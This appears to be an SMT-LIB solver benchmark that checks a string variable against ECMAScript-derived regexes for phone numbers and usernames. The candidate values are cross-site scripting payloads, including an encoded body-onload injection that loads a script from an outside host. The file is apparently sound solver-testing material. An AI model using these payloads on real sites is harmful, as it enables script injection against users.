; lang_ops, Unicode mode: x from a disjunction of constants, (negated) membership of x in a regex built by language operations from ECMAScript regexes
(set-logic QF_SLIA)
(set-info :status sat)
(declare-const x String)
(assert (or (= x "<noscript onmo\u{1f4a9}useup=""alert(1)"">test</noscript>") (= x "<meta onclick=""alert(1)"">test</meta>") (= x "%22/%3E%3CBODY%20onload=\u{2019}document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)\u{2019}%3E")))
(assert (not (str.in_re x (re.comp (re.union ((_ re.from_regex ecma2020 u) "^\+?[0-9]{3}-?[0-9]{6,12}$") (re.union ((_ re.from_regex ecma2020 u) "^[a-zA-Z0-9]([._](?![._])|[a-zA-Z0-9]){6,18}[a-zA-Z0-9]$") ((_ re.loop 116 122) re.allchar)))))))
(check-sat)
